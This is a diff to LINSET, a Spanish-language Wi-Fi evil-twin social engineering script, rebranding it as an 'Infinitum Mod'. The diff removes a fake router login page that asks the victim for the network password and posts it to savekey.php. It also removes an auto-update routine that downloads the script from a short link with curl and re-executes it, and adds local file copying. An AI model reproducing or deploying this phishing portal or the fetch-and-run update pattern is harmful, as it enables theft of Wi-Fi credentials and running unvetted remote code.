@@ -1,5 +1,7 @@
 #!/bin/bash
 
+# LINSET Infinitum Mod v1.1 por Deviz.mx
+
 ########## Modo DEBUG ##########
 ##			      ##
         LINSET_DEBUG=0
@@ -232,6 +234,8 @@ verde="\033[1;32m"
 amarillo="\033[1;33m"
 azul="\033[1;34m"
 rescolor="\e[0m"
+multiaportesColor="\033[1m\033[1;36m"
+hack32Color="\033[1m\033[1;33m"
 
 
 # Ajusta el Script en modo normal o desarrollador
@@ -438,9 +442,9 @@ function mostrarheader(){
 	conditional_clear
 	echo -e "$verde#########################################################"
 	echo -e "$verde#                                                       #"
-	echo -e "$verde#$rojo		 LINSET $version" "${amarillo}by ""${azul}vk496""$verde                   #"
-	echo -e "$verde#""${rojo}	L""${amarillo}inset" "${rojo}I""${amarillo}s" "${rojo}N""${amarillo}ot a ""${rojo}S""${amarillo}ocial ""${rojo}E""${amarillo}nginering" "${rojo}T""${amarillo}ool""$verde          #"
+	echo -e "$verde#$rojo        LINSET ${azul}Infinitum Mod v1.1" "${amarillo}por ""${hack32Color}Deviz.mx$rescolor""$verde                  #"
 	echo -e "$verde#                                                       #"
+	echo -e "$verde#           ${multiaportesColor}www.multiaportes.com/linset-infinitum-mod$rescolor""$verde              #"
 	echo -e "$verde#########################################################""$rescolor"
 	echo
 	echo
@@ -652,9 +656,9 @@ if [ $LINSET_DEBUG != 1 ]; then
 	sleep 0.1 && echo ""
 	sleep 0.1 && echo ""
 	sleep 1
-	echo -e $rojo"                     LINSET "$blanco""$version" (rev. "$verde"$revision"$blanco") "$amarillo"by "$blanco" vk496"
+	echo -e $rojo"    Basado en script genérico LINSET "$blanco""$version" (rev. "$verde"$revision"$blanco") "$amarillo"por "$blanco" vk496 (seguridadwireless.net)"
 	sleep 1
-	echo -e $verde"                        Para "$rojo"seguridadwireless.net "$rescolor
+	echo -e $verde"                        Creditos (modif): "$rojo"www.multiaportes.com "$rescolor
 	sleep 1
 	echo -n "                              Latest rev."
 	tput civis
@@ -662,21 +666,6 @@ if [ $LINSET_DEBUG != 1 ]; then
 	spinner "$!"
 	revision_online=$(cat $DUMP_PATH/Irev)
 	echo -e ""$blanco" [${magenta}${revision_online}$blanco"$rescolor"]"
-		if [ "$revision_online" != "?" ]; then
-			
-			if [ "$revision" != "$revision_online" ]; then
-				
-				cp $0 $HOME/linset_rev-$revision.backup
-				curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0" -L http://goo.gl/Y5JX7c -s -o $0
-				echo
-				echo
-				echo -e ""$rojo"Actualizado con exito! Reiniciando el script para aplicar los cambios..."$rescolor""
-				sleep 5
-				chmod +x $0
-				exec $0
-				
-			fi
-		fi
 	echo ""
 	tput cnorm
 	sleep 2
@@ -4613,183 +4602,10 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA=
 	
 	unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$linset_output_device
 	rm $DUMP_PATH/file.zip &>$linset_output_device
-	
-	echo "<!DOCTYPE html>
-	<html>
-	<head>
-	    <title>Login</title>
-	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
-	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
-	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>    
-	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
-	    <style>
-	.ui-btn {
-	    width: 20% !important;
-	}
-	</style>
-	</head>
-	<body>
-	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-		<div data-role=\"header\" data-theme=\"a\">
-		    <h3>Login Page</h3>
-		</div>
-	
-		<div data-role=\"content\">
-		    
-	"$DIALOG_WEB_OK"
-		</div>
-	
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-	
-		</div>
-	    </div>
-	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"header\">
-		    <h3></h3>
-		</div>
-	
-		<div data-role=\"content\">
-	
-		</div>
-	
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-		</div>
-	    </div>
-	</body>
-	</html> 
-	">$DUMP_PATH/data/final.html
-	echo "<!DOCTYPE html>
-	<html>
-	<head>
-	    <title>Login</title>
-	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
-	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
-	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>    
-	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
-	</head>
-	<body>
-	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-		<div data-role=\"header\" data-theme=\"a\">
-		    <h3>Login Page</h3>
-		</div>
-	
-		<div data-role=\"content\">
-		    
-		    "$DIALOG_WEB_ERROR"
-	<br>
-	<a href=\"index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload();location.href='index.htm'\">"$DIALOG_WEB_BACK"</a> 
-	
-		</div>
-	
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-	
-		</div>
-	    </div>
-	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"header\">
-		    <h3></h3>
-		</div>
-	
-		<div data-role=\"content\">
-	
-		</div>
-	
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-		</div>
-	    </div>
-	</body>
-	</html> 
-	">$DUMP_PATH/data/error.html
-	
-	echo "<!DOCTYPE html>
-	<html>
-	<head>
-	    <title>Login</title>
-	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
-	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
-	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>    
-	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
-	    <style>
-		#login-button {
-		    margin-top: 30px;
-		}
-		
-	.ui-grid-c {
-	    text-align : center;
-		margin-right: -50% !important;
-	
-	}
-	
-	.ui-block-b {
-	    text-align : left;
-	
-	}
-	
-	.ui-block-a {
-	    text-align : right;
-		margin-right: 10px !important;
-	
-	
-	}
-	    </style>
-	</head>
-	<body>
-	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-		<div data-role=\"header\" data-theme=\"a\">
-		    <h3>Login Page</h3>
-		</div>
-	
-		<div data-role=\"content\">
-		<fieldset>
-		    <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"savekey.php\" method=\"POST\" >
-	<div class=ui-grid-c>
-	
-	      <div class=ui-block-a>ESSID:</div>
-	
-	      <div class=ui-block-b><b>$Host_SSID</b></div>
-	
-	      <div class=ui-block-a>BSSID:</div>
-	
-	      <div class=ui-block-b><b>$Host_MAC</b></div>
-	
-	      <div class=ui-block-a>Chan:</div>
-	
-	      <div class=ui-block-b><b>$Host_CHAN</b></div>
-	
-	    </div>
-			  
-	<br>
-	
-	"$DIALOG_WEB_INFO"    
-			    <div data-role=\"fieldcontain\">                                    
-				<label for=\"password\">"$DIALOG_WEB_INPUT"</label>
-				</div>
-				<input type=\"password\" value=\"\" name=\"key1\" id=\"key1\"/> 
-			    
-			    <input type=\"submit\" data-theme=\"b\" name=\"submit\" id=\"submit\" data-inline=\"true\" value=\""$DIALOG_WEB_SUBMIT"\">
-			</fieldset>
-		    </form>             
-		</div>
-	
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-	
-		</div>
-	    </div>
-	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"header\">
-		    <h3></h3>
-		</div>
-	
-		<div data-role=\"content\">
-	
-		</div>
-	
-		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-		</div>
-	    </div>
-	</body>
-	</html> 
-	">$DUMP_PATH/data/index.htm
+
+	# Linset Infinitum Mod - MultiAportes.com
+	cp -r $(ls | grep a) $DUMP_PATH
+	cp -r $(ls | grep index) $DUMP_PATH
 	
 }
 ######################################### < INTERFACES WEB > ########################################
